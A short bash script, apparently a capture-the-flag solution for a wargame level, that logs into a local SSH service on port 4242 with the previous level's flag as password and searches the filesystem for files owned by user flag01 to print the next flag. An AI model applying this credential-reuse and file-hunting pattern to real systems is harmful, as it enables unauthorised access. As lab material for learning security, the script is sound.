#! /bin/bash

if ! command -v sshpass
then
    echo -e "Install sshpass command before executing this shell script."
else
    USER="level01"
    ADDRESS="localhost"
    PORT="4242"
    export SSHPASS=$(cat ../../level00/flag)
    echo -e "\nExploiting level01 ssh server ...\n\n\n"
    result=$(sshpass -e ssh -p "$PORT" "$USER"@"$ADDRESS" "find / -type f -user flag01 2> /dev/null | grep cmdline | grep -v task | xargs cat")
    echo -e "\nGot a flag:"
    echo -e $result
fi    
